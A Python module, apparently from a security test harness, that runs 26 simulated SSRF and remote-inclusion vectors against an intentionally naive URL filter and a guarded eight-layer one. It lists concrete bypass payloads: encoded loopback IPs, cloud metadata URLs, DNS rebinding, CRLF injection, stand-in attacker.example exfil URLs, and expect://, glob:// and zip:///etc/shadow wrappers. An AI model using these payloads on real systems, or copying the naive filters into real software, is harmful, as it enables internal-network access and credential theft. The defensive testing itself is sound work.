"""Домен RFI/SSRF: 26 векторов против 8 слоёв защиты.

v10 расширяет арсенал в два направления:

* **комплексные векторы** — IPv4-mapped IPv6 в hex-форме (``::ffff:7f00:1``
  не содержит «127.0.0.1» и не выглядит loopback'ом), link-local с зоной
  индекса (``fe80::a1%eth0``), цикл редиректов (клиент без лимита глубины
  расходует переходы), доставка ``data://``-payload вторым хопом (схему
  проверяют только на первом), суффиксная маска доверенного домена
  (``trusted.example.attacker.example`` проходит prefix-проверку);
* **простой залп** — короткие формы IP (``127.1``, ``127.0.1``), нулевые
  дополнения октетов (``0177.0000.0000.0001``), короткая форма IPv6
  (``[::0:1]``), не-unused-обработчики превью ``glob://`` и ``zip://``:
  каждая тривиальная форма проверяется отдельно, потому что фильтр мог
  быть рассчитан только на «каноническое» написание.

Наивная реализация песочницы — три операции «интеграции с внешними
источниками», каждая со своей ловушкой:

* ``naive_avatar`` разрешает источники префиксом-«белым списком» без
  разделителя (``startswith``), а затем слепо следует редиректам (до 20
  переходов — как curl, но без запретов);
* ``naive_sync`` держит чёрный список приватных подсетей по подстрокам
  URL и никогда не канонизирует хост (десятичные/шестнадцатеричные/
  восьмеричные/короткие IP, длинная и короткая формы IPv6, IPv4-mapped,
  percent-encoded authority, DNS-rebinding и redirector проходят мимо);
* ``naive_preview`` сворачивает регистр и пробелы в схеме и допускает
  экзотические обработчики (data, expect, glob, zip).

Весь «сеть»-слой симулирован: резолвер DNS — статическая таблица,
редиректы — рекурсия с лимитом, ни один вектор не покидает процесс.
Охраняемая реализация прогоняет URL через восемь слоёв: строгая схема,
контроль authority, канонизация хоста с разбором IP-литералов и
IPv4-mapped форм, омоглиф-контроль, egress-allowlist, запрет кросс-origin
редиректов, пин DNS-ответа и лимит глубины редиректов.
"""

from __future__ import annotations

import base64
import ipaddress
import re
import unicodedata
from dataclasses import dataclass
from urllib.parse import parse_qs, unquote, urlsplit

from app.agent.arsenal.core import (
    CampaignResult,
    DefenseHold,
    Layer,
    NaiveRejected,
    Vector,
    VectorOutcome,
)
from app.http_guard import fully_decode

TRUSTED_HOST = "trusted.example"
SYNC_HOST = "sync.internal.example"
EVIL_HOST = "attacker.example"
METADATA_IP = "169.254.169.254"
LOOPBACK_IP = "127.0.0.1"

# симулятор DNS: домен -> ответ A-записи (rebind -> метаданные облака)
SIM_DNS = {
    EVIL_HOST: "203.0.113.7",
    "rebind.attacker.example": METADATA_IP,  # TTL=0: повторный ответ — внутренний
    "redirector.attacker.example": "203.0.113.7",
    SYNC_HOST: "10.0.0.42",
}

_NAIVE_REDIRECT_CAP = 20  # «как curl»: лимит есть, запретов нет
_REDIRECT_DEPTH_LIMIT = 2  # охраняемый лимит глубины переходов

LAYERS = [
    Layer(
        "R1",
        "строгая схема",
        "после полного декодирования и свёртки регистра/пробелов схема "
        "должна быть ровно http/https; data, expect, glob, zip и прочие "
        "обработчики запрещены",
    ),
    Layer(
        "R2",
        "контроль authority",
        "userinfo отделяется до любых проверок хоста; CR/LF/табуляция и "
        "прочие контрольные байты в любой части URL запрещены",
    ),
    Layer(
        "R3",
        "канонизация хоста",
        "percent-encoded/десятичный/шестнадцатеричный/восьмеричный/короткий "
        "IP, любая форма IPv6, IPv4-mapped и scoped-адреса разбираются "
        "ipaddress'ом; приватные, loopback и link-local диапазоны отклоняются",
    ),
    Layer(
        "R4",
        "омоглиф-контроль",
        "хост нормализуется NFKC; смешанные скрипты и не-ASCII хосты "
        "отклоняются (IDN-омоглифы не проходят)",
    ),
    Layer(
        "R5",
        "egress-allowlist",
        "итоговый хост обязан состоять в реестре разрешённых источников "
        "операции; префиксные проверки вместо сравнения хоста запрещены",
    ),
    Layer(
        "R6",
        "запрет кросс-origin редиректов",
        "каждый переход редиректа перевалидируется: переход на другой хост "
        "не следует автоматически",
    ),
    Layer(
        "R7",
        "пин DNS-ответа",
        "домен резолвится один раз, соединение идёт на зафиксированный IP, "
        "и зафиксированный IP повторно проверяется на приватность",
    ),
    Layer(
        "R8",
        "лимит глубины редиректов",
        "число переходов ограничено независимо от их валидности: "
        "redirect-циклы и длинные цепочки не расходуют ресурсы клиента",
    ),
]

VECTORS = [
    Vector(
        "rfi_userinfo_confusion",
        "userinfo-подмена authority",
        "CWE-918",
        "https://trusted.example@attacker.example/ проходит префикс-проверку, "
        "фактический хост — attacker",
        ("R2", "R5"),
    ),
    Vector(
        "rfi_trusted_redirect_hop",
        "редирект с доверенного хоста",
        "CWE-601",
        "доверенный источник отвечает 302 на внешнего атакующего; клиент "
        "следует без перевалидации",
        ("R6", "R5"),
    ),
    Vector(
        "rfi_tab_authority",
        "закодированная табуляция в authority",
        "CWE-918",
        "%09 в userinfo уводит парсер: префикс доверенный, хост — атакующий",
        ("R2", "R5"),
    ),
    Vector(
        "rfi_ipv6_loopback_longform",
        "длинная форма IPv6-loopback",
        "CWE-918",
        "0:0:0:0:0:0:0:1 не матчится подсрочным фильтром ::1 и попадает в loopback",
        ("R3",),
    ),
    Vector(
        "rfi_decimal_ip",
        "десятичный IP-литерал",
        "CWE-918",
        "http://2130706433/ — это 127.0.0.1; подстрочный фильтр не видит",
        ("R3",),
    ),
    Vector(
        "rfi_hex_ip",
        "шестнадцатеричный IP-литерал",
        "CWE-918",
        "http://0x7f000001/ разбирается стеками в 127.0.0.1",
        ("R3",),
    ),
    Vector(
        "rfi_octal_ip",
        "восьмеричные октеты",
        "CWE-918",
        "http://0177.0.0.1/ интерпретируется как 127.0.0.1",
        ("R3",),
    ),
    Vector(
        "rfi_percent_encoded_authority",
        "percent-encoded authority",
        "CWE-918",
        "%31%32%37.0.0.1 декодируется lenient-клиентом в 127.0.0.1 после проверок",
        ("R3",),
    ),
    Vector(
        "rfi_dns_rebind",
        "DNS-rebinding на метаданные",
        "CWE-918",
        "TTL=0: первый ответ внешний, соединение идёт на 169.254.169.254",
        ("R5", "R7"),
    ),
    Vector(
        "rfi_redirector_hop",
        "закодированный переход через redirector",
        "CWE-918",
        "to= закодирован, поэтому подстрочный фильтр не видит внутренний "
        "адрес; редирект раскрывает его на втором хопе",
        ("R5", "R6"),
    ),
    Vector(
        "rfi_crlf_inject",
        "CRLF-инъекция в исходящий запрос",
        "CWE-93",
        "%0d%0a в URL подмешивает заголовки в исходящий запрос",
        ("R2",),
    ),
    Vector(
        "rfi_scheme_case_space",
        "регистр и пробелы в схеме",
        "CWE-918",
        " hTtP:// проходит «схемный» allowlist после свёртки и уводит "
        "запрос на чужой хост",
        ("R1", "R5"),
    ),
    Vector(
        "rfi_data_url",
        "data:// без egress",
        "CWE-918",
        "data://text/plain;base64,… доставляет payload без сетевого запроса",
        ("R1",),
    ),
    Vector(
        "rfi_expect_wrapper",
        "expect:// исполнение команды",
        "CWE-918",
        "обработчик expect:// превращает URL в исполнение команды",
        ("R1",),
    ),
    Vector(
        "rfi_ipv6_metadata_fd00",
        "метаданные облака по IPv6",
        "CWE-918",
        "http://[fd00:ec2::254]/ — IMDSv6; чёрные списки смотрят только IPv4-подстроки",
        ("R3",),
    ),
    # --- комплексные векторы (v10) --------------------------------------------
    Vector(
        "rfi_ipv4_mapped_hex",
        "IPv4-mapped IPv6 в hex-форме",
        "CWE-918",
        "[::ffff:7f00:1] не содержит «127.0.0.1» и не парсится фильтрами "
        "как loopback; канонизация раскрывает mapped-адрес",
        ("R3",),
    ),
    Vector(
        "rfi_ipv6_zone_linklocal",
        "link-local с зоной индекса",
        "CWE-918",
        "[fe80::a1%25eth0] — зона после % исчезает в percent-декодировании "
        "и не матчится хрупкими фильтрами fe80::",
        ("R3",),
    ),
    Vector(
        "rfi_redirect_loop_depth",
        "цикл редиректов без лимита глубины",
        "CWE-601",
        "доверенный источник редиректит сам на себя: клиент без лимита "
        "переходов расходует соединения и время",
        ("R8",),
    ),
    Vector(
        "rfi_redirect_to_data_hop",
        "доставка data-payload вторым хопом",
        "CWE-601",
        "схему проверяют только на первом хопе; редирект доставляет "
        "data://-payload мимо схемного allowlist",
        ("R1", "R6"),
    ),
    Vector(
        "rfi_subdomain_suffix",
        "суффиксная маска доверенного домена",
        "CWE-918",
        "trusted.example.attacker.example проходит startswith-проверку: "
        "префикс совпал, домен — атакующий",
        ("R5",),
    ),
    # --- простой залп (v10) ---------------------------------------------------
    Vector(
        "rfi_shortform_ip_2part",
        "короткая форма IP из двух частей",
        "CWE-918",
        "http://127.1/ разворачивается стеками в 127.0.0.1",
        ("R3",),
    ),
    Vector(
        "rfi_shortform_ip_3part",
        "короткая форма IP из трёх частей",
        "CWE-918",
        "http://127.0.1/ разворачивается стеками в 127.0.0.1",
        ("R3",),
    ),
    Vector(
        "rfi_zero_padded_octal",
        "нулевые дополнения октетов",
        "CWE-918",
        "http://0177.0000.0000.0001/ — паддинг роняет хрупкие regex-фильтры",
        ("R3",),
    ),
    Vector(
        "rfi_ipv6_shortform_zero",
        "короткая форма IPv6 с нулевой группой",
        "CWE-918",
        "[::0:1] не содержит литерала ::1 и попадает в loopback",
        ("R3",),
    ),
    Vector(
        "rfi_glob_wrapper",
        "glob:// обработчик превью",
        "CWE-918",
        "glob:///srv/* перечисляет файлы через неограниченный обработчик",
        ("R1",),
    ),
    Vector(
        "rfi_zip_wrapper",
        "zip:// обработчик превью",
        "CWE-918",
        "zip:///etc/shadow читает архив через неограниченный обработчик",
        ("R1",),
    ),
]


# --------------------------------------------------------------------------
# Песочница
# --------------------------------------------------------------------------


def _build_payloads() -> dict[str, str]:
    return {
        "rfi_userinfo_confusion": f"https://{TRUSTED_HOST}@{EVIL_HOST}/avatar.png",
        "rfi_trusted_redirect_hop": (
            f"https://{TRUSTED_HOST}/redirect?to=http://{EVIL_HOST}/exfil"
        ),
        "rfi_tab_authority": f"https://{TRUSTED_HOST}%09@{EVIL_HOST}/avatar.png",
        "rfi_ipv6_loopback_longform": "http://[0:0:0:0:0:0:0:1]/admin",
        "rfi_decimal_ip": f"http://{int(ipaddress.ip_address(LOOPBACK_IP))}/admin",
        "rfi_hex_ip": "http://0x7f000001/admin",
        "rfi_octal_ip": "http://0177.0.0.1/admin",
        "rfi_percent_encoded_authority": "http://%31%32%37.0.0.1/admin",
        "rfi_dns_rebind": "http://rebind.attacker.example/latest/meta-data/",
        "rfi_redirector_hop": (
            "http://redirector.attacker.example/hop?to="
            + unquote_to_quote(f"http://{METADATA_IP}/latest/meta-data/")
        ),
        "rfi_crlf_inject": (f"https://{TRUSTED_HOST}/x?next=%0d%0aX-Injected:%20yes"),
        "rfi_scheme_case_space": f" hTtP://{EVIL_HOST}/steal",
        "rfi_data_url": "data://text/plain;base64,QVJTRU5BTC1QQVlMT0FE",
        "rfi_expect_wrapper": "expect://id",
        "rfi_ipv6_metadata_fd00": "http://[fd00:ec2::254]/latest/meta-data/",
        "rfi_ipv4_mapped_hex": "http://[::ffff:7f00:1]/admin",
        "rfi_ipv6_zone_linklocal": "http://[fe80::a1%25eth0]/admin",
        "rfi_redirect_loop_depth": f"https://{TRUSTED_HOST}/redirect",
        "rfi_redirect_to_data_hop": (
            f"https://{TRUSTED_HOST}/redirect?to=data://text/plain;base64,QVJTRU5BTC1QQVlMT0FE"
        ),
        "rfi_subdomain_suffix": f"https://{TRUSTED_HOST}.{EVIL_HOST}/avatar.png",
        "rfi_shortform_ip_2part": "http://127.1/admin",
        "rfi_shortform_ip_3part": "http://127.0.1/admin",
        "rfi_zero_padded_octal": "http://0177.0000.0000.0001/admin",
        "rfi_ipv6_shortform_zero": "http://[::0:1]/admin",
        "rfi_glob_wrapper": "glob:///srv/*",
        "rfi_zip_wrapper": "zip:///etc/shadow",
    }


def unquote_to_quote(value: str) -> str:
    """Кодировать цель целиком (включая точки) для переноса в параметр to=.

    Полное кодирование нужно, чтобы подстрочный фильтр приватных подсетей
    не увидел литеральный ``169.254.`` во втором хопе.
    """
    return value.replace(":", "%3a").replace("/", "%2f").replace(".", "%2e")


@dataclass
class RfiSandbox:
    payloads: dict[str, str]

    def __enter__(self) -> "RfiSandbox":
        return self

    def __exit__(self, *exc) -> None:
        return None

    def unavailable(self) -> set[str]:
        return set()


def build_context() -> RfiSandbox:
    return RfiSandbox(payloads=_build_payloads())


# --------------------------------------------------------------------------
# Наивная реализация
# --------------------------------------------------------------------------


def naive_avatar(url: str) -> str:
    if not url.startswith("https://" + TRUSTED_HOST):  # ловушка: нет разделителя
        raise NaiveRejected("avatar: чужой источник")
    return naive_fetch(url, follow=True)


def naive_sync(url: str) -> str:
    low = url.lower()
    for bad in (
        "127.0.0.1",
        "169.254.",
        "192.168.",
        "10.",
        "0.0.0.0",
        "localhost",
        "::1",
    ):
        if bad in low:  # ловушка: подстрочный фильтр вместо канонизации
            raise NaiveRejected("sync: внутренний адрес")
    return naive_fetch(url, follow=True)


def naive_preview(url: str) -> str:
    url = url.strip()
    scheme = url.split("://", 1)[0].replace(" ", "").replace("\t", "").lower()
    if scheme not in {"http", "https", "data", "expect", "glob", "zip"}:
        raise NaiveRejected("preview: неизвестная схема")
    return naive_fetch(url, follow=False)


def naive_fetch(url: str, follow: bool, hops: int = 0) -> str:
    v = url.strip().replace("\\", "/")  # «браузерная» совместимость
    mark = ""
    if "%0d%0a" in v.lower() or "\r" in v or "\n" in v:
        mark = " CRLF-INJECTED"
    parsed = urlsplit(v)
    scheme = parsed.scheme.lower()
    raw_tail = v.split("://", 1)[1] if "://" in v else ""
    if scheme == "data":
        encoded = raw_tail.split("base64,", 1)[-1]
        try:
            return "DATA-PREVIEW: " + base64.b64decode(encoded).decode(
                "utf-8", "replace"
            )
        except Exception:  # noqa: BLE001 - симулятор: любой сбой = payload
            return "DATA-PREVIEW: <garbled>"
    if scheme == "expect":
        return "RCE-SIM: " + raw_tail + mark
    if scheme == "glob":
        return "LIST-SIM: " + raw_tail + mark
    if scheme == "zip":
        return "ZIPREAD-SIM: " + raw_tail + mark
    host = (parsed.hostname or "").lower()
    if host.startswith("[") and host.endswith("]"):
        host = host[1:-1]
    if "%" in host:
        host = unquote(host)  # lenient-клиент декодирует authority
    if follow and hops >= _NAIVE_REDIRECT_CAP:
        return f"REDIRECT-LIMIT-REACHED hops={hops}{mark}"
    if host == TRUSTED_HOST and follow and "redirect" in (parsed.path or ""):
        # 302 без to= — «Location: сам на себя»: клиент без лимита ходит по кругу
        return naive_fetch(_redirect_target(v) or v, follow=True, hops=hops + 1)
    if host == "redirector.attacker.example" and follow:
        return naive_fetch(_redirect_target(v), follow=True, hops=hops + 1)
    ip = _resolve(host)
    return f"FETCHED ip={ip} host={host}{mark}"


def _redirect_target(url: str) -> str:
    query = urlsplit(url).query
    return parse_qs(query).get("to", [""])[0]


def _resolve(host: str) -> str:
    if host in SIM_DNS:
        return SIM_DNS[host]
    if host.replace(".", "").isdigit() and "." not in host:
        return str(ipaddress.ip_address(int(host)))  # десятичный литерал
    if host.startswith("0x"):
        return str(ipaddress.ip_address(int(host, 16)))  # hex-литерал
    parts = host.split(".")
    if len(parts) == 2 and all(p.isdigit() for p in parts):
        # короткая форма a.b: старшие октеты a, младшие b
        return str(ipaddress.ip_address(int(parts[0]) << 24 | int(parts[1])))
    if len(parts) == 3 and all(p.isdigit() for p in parts):
        # короткая форма a.b.c: c занимает два младших октета
        return str(
            ipaddress.ip_address(
                int(parts[0]) << 24 | int(parts[1]) << 16 | int(parts[2])
            )
        )
    if len(parts) == 4 and all(
        p.isdigit() and (len(p) == 1 or p.startswith("0")) for p in parts
    ):
        return ".".join(str(int(p, 8)) for p in parts)  # восьмеричные октеты
    try:
        return str(ipaddress.ip_address(host))  # IPv6 и прочие литералы
    except ValueError:
        return "203.0.113.7"


NAIVE_OPS = {
    "rfi_userinfo_confusion": naive_avatar,
    "rfi_trusted_redirect_hop": naive_avatar,
    "rfi_tab_authority": naive_avatar,
    "rfi_crlf_inject": naive_avatar,
    "rfi_redirect_loop_depth": naive_avatar,
    "rfi_redirect_to_data_hop": naive_avatar,
    "rfi_subdomain_suffix": naive_avatar,
    "rfi_ipv6_loopback_longform": naive_sync,
    "rfi_decimal_ip": naive_sync,
    "rfi_hex_ip": naive_sync,
    "rfi_octal_ip": naive_sync,
    "rfi_percent_encoded_authority": naive_sync,
    "rfi_dns_rebind": naive_sync,
    "rfi_redirector_hop": naive_sync,
    "rfi_ipv6_metadata_fd00": naive_sync,
    "rfi_ipv4_mapped_hex": naive_sync,
    "rfi_ipv6_zone_linklocal": naive_sync,
    "rfi_shortform_ip_2part": naive_sync,
    "rfi_shortform_ip_3part": naive_sync,
    "rfi_zero_padded_octal": naive_sync,
    "rfi_ipv6_shortform_zero": naive_sync,
    "rfi_scheme_case_space": naive_preview,
    "rfi_data_url": naive_preview,
    "rfi_expect_wrapper": naive_preview,
    "rfi_glob_wrapper": naive_preview,
    "rfi_zip_wrapper": naive_preview,
}

HIT_MARKERS = {
    "rfi_userinfo_confusion": (EVIL_HOST, "запрос ушёл на attacker.example"),
    "rfi_trusted_redirect_hop": (EVIL_HOST, "редирект привёл к атакующему"),
    "rfi_tab_authority": (EVIL_HOST, "табуляция уводит authority"),
    "rfi_ipv6_loopback_longform": ("ip=::1", "loopback IPv6 достигнут"),
    "rfi_decimal_ip": (f"ip={LOOPBACK_IP}", "десятичный IP -> loopback"),
    "rfi_hex_ip": (f"ip={LOOPBACK_IP}", "hex-IP -> loopback"),
    "rfi_octal_ip": (f"ip={LOOPBACK_IP}", "восьмеричные октеты -> loopback"),
    "rfi_percent_encoded_authority": (f"ip={LOOPBACK_IP}", "percent-host -> loopback"),
    "rfi_dns_rebind": (METADATA_IP, "rebind попал в метаданные"),
    "rfi_redirector_hop": (METADATA_IP, "редиректор привёл в метаданные"),
    "rfi_crlf_inject": ("CRLF-INJECTED", "заголовки подмешаны"),
    "rfi_scheme_case_space": (EVIL_HOST, "чужой хост принят превью"),
    "rfi_data_url": ("DATA-PREVIEW: ARSENAL-PAYLOAD", "payload доставлен без egress"),
    "rfi_expect_wrapper": ("RCE-SIM: id", "команда исполнена симулятором"),
    "rfi_ipv6_metadata_fd00": ("ip=fd00:ec2::254", "IMDSv6 достигнут"),
    "rfi_ipv4_mapped_hex": ("ip=::ffff:", "IPv4-mapped loopback достигнут"),
    "rfi_ipv6_zone_linklocal": ("ip=fe80::a1%eth0", "link-local с зоной достигнут"),
    "rfi_redirect_loop_depth": (
        "REDIRECT-LIMIT-REACHED",
        "клиент выжег весь лимит переходов на цикле",
    ),
    "rfi_redirect_to_data_hop": (
        "DATA-PREVIEW: ARSENAL-PAYLOAD",
        "второй хоп доставил data-payload",
    ),
    "rfi_subdomain_suffix": (EVIL_HOST, "суффиксная маска уводит на attacker"),
    "rfi_shortform_ip_2part": (f"ip={LOOPBACK_IP}", "короткая форма 127.1 -> loopback"),
    "rfi_shortform_ip_3part": (
        f"ip={LOOPBACK_IP}",
        "трёхчастная форма 127.0.1 -> loopback",
    ),
    "rfi_zero_padded_octal": (f"ip={LOOPBACK_IP}", "паддинг октетов -> loopback"),
    "rfi_ipv6_shortform_zero": ("ip=::1", "короткая форма ::0:1 -> loopback"),
    "rfi_glob_wrapper": ("LIST-SIM:", "glob-обработчик перечислил файлы"),
    "rfi_zip_wrapper": ("ZIPREAD-SIM:", "zip-обработчик прочитал архив"),
}


def naive_run(ctx: RfiSandbox, vector_id: str) -> tuple[bool, str]:
    payload = ctx.payloads[vector_id]
    op = NAIVE_OPS[vector_id]
    try:
        detail = op(payload)
    except NaiveRejected as exc:
        return False, f"отклонено наивной проверкой: {exc.code}"
    marker, hit_detail = HIT_MARKERS[vector_id]
    return (marker in detail, f"{hit_detail} [{detail}]")


# --------------------------------------------------------------------------
# Охраняемая реализация
# --------------------------------------------------------------------------

_SCHEME_LEAD = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.\-]*)://")


def _host_literal(host: str):
    """Канонизировать хост в IP-литерал (все формы: dec/hex/oct/short/IPv6)."""
    candidate = host
    if host.replace(".", "").isdigit() and "." not in host:
        candidate = str(ipaddress.ip_address(int(host)))  # десятичный литерал
    elif host.startswith("0x"):
        candidate = str(ipaddress.ip_address(int(host, 16)))  # hex-литерал
    else:
        parts = host.split(".")
        if len(parts) == 2 and all(p.isdigit() for p in parts):
            candidate = str(
                ipaddress.ip_address(int(parts[0]) << 24 | int(parts[1]))
            )  # короткая форма a.b
        elif len(parts) == 3 and all(p.isdigit() for p in parts):
            candidate = str(
                ipaddress.ip_address(
                    int(parts[0]) << 24 | int(parts[1]) << 16 | int(parts[2])
                )
            )  # короткая форма a.b.c
        elif len(parts) == 4 and all(
            p.isdigit() and (len(p) == 1 or p.startswith("0")) for p in parts
        ):
            candidate = ".".join(str(int(p, 8)) for p in parts)  # восьмеричные
    try:
        return ipaddress.ip_address(candidate)
    except ValueError:
        return None


def _is_internal(literal) -> bool:
    """Приватность с раскрытием IPv4-mapped форм (scoped-адреса учитываются)."""
    mapped = getattr(literal, "ipv4_mapped", None)
    if mapped is not None:
        literal = mapped
    return bool(literal.is_private or literal.is_loopback or literal.is_link_local)


def safe_remote_url(raw: str, *, allowlist: set[str]) -> str:
    """Проверить URL по слоям R1-R5 (R6/R7/R8 — в транспорте)."""
    value = fully_decode(raw)  # каноническая форма до проверок
    match = _SCHEME_LEAD.match(value.strip())
    if not match or match.group(1).lower() not in {"http", "https"}:
        raise DefenseHold("R1", "scheme_not_allowed")  # R1: строгая схема
    if any(ord(ch) < 32 for ch in value):
        raise DefenseHold("R2", "control_char_in_url")  # R2: CR/LF/табуляция
    netloc = urlsplit(value).netloc
    host = netloc.rsplit("@", 1)[-1]  # R2: userinfo не участвует в проверках
    if host.startswith("[") and "]" in host:
        host = host[1 : host.index("]")]
    else:
        host = host.split(":", 1)[0]  # срезать порт
    host = unquote(host).lower()  # R3: percent-encoded authority
    literal = _host_literal(host)
    if literal is not None and _is_internal(literal):
        raise DefenseHold("R3", "internal_address_literal")  # R3
    if literal is None:
        normalized = unicodedata.normalize("NFKC", host)
        if not normalized.isascii() or normalized != host:
            raise DefenseHold("R4", "homograph_host")  # R4: омоглифы
    if host not in allowlist:
        raise DefenseHold("R5", "host_not_allowed")  # R5: egress-allowlist
    return value


def pinned_fetch(url: str, allowlist: set[str], depth: int = 0) -> str:
    """Транспорт охраняемой реализации: R6 (редиректы), R7 (пин DNS), R8."""
    parsed = urlsplit(url)
    host = (parsed.hostname or "").lower()
    ip = SIM_DNS.get(host)
    if ip is not None:
        literal = ipaddress.ip_address(ip)
        if literal.is_private or literal.is_loopback or literal.is_link_local:
            raise DefenseHold("R7", "pinned_internal_ip")  # R7: пин DNS
    if "redirect" in (parsed.path or ""):
        if depth >= _REDIRECT_DEPTH_LIMIT:
            raise DefenseHold("R8", "redirect_depth_exceeded")  # R8: лимит глубины
        target = _redirect_target(url) or url  # self-loop: Location сам на себя
        target_host = (urlsplit(target).hostname or "").lower()
        safe_remote_url(target, allowlist=allowlist)  # повторная перевалидация
        if target_host != host:
            raise DefenseHold("R6", "cross_origin_redirect")  # R6
        return pinned_fetch(target, allowlist, depth + 1)
    return f"FETCHED host={host}"


AVATAR_ALLOWLIST = {TRUSTED_HOST}
SYNC_ALLOWLIST = {SYNC_HOST}

_AVATAR_VECTORS = {
    "rfi_userinfo_confusion",
    "rfi_trusted_redirect_hop",
    "rfi_tab_authority",
    "rfi_crlf_inject",
    "rfi_scheme_case_space",
    "rfi_data_url",
    "rfi_expect_wrapper",
    "rfi_redirect_loop_depth",
    "rfi_redirect_to_data_hop",
    "rfi_subdomain_suffix",
    "rfi_glob_wrapper",
    "rfi_zip_wrapper",
}


def guarded_run(ctx: RfiSandbox, vector_id: str) -> tuple[bool, str, str]:
    payload = ctx.payloads[vector_id]
    allowlist = AVATAR_ALLOWLIST if vector_id in _AVATAR_VECTORS else SYNC_ALLOWLIST
    try:
        safe_remote_url(payload, allowlist=allowlist)
        pinned_fetch(payload, allowlist)
    except DefenseHold as hold:
        return True, hold.layer, hold.code
    return False, "", "охраняемая реализация допустила исходящий запрос"


# --------------------------------------------------------------------------
# Кампании и матрица
# --------------------------------------------------------------------------


def campaign() -> CampaignResult:
    result = CampaignResult(
        category="rfi", title="RFI/SSRF: удалённое включение и SSRF"
    )
    with build_context() as ctx:
        for vector in VECTORS:
            if vector.id in ctx.unavailable():
                result.outcomes.append(
                    VectorOutcome(vector, None, "пропуск платформой", None, "", "")
                )
                continue
            attack_ok, attack_detail = naive_run(ctx, vector.id)
            hold_ok, hold_layer, hold_detail = guarded_run(ctx, vector.id)
            result.outcomes.append(
                VectorOutcome(
                    vector, attack_ok, attack_detail, hold_ok, hold_layer, hold_detail
                )
            )
    return result
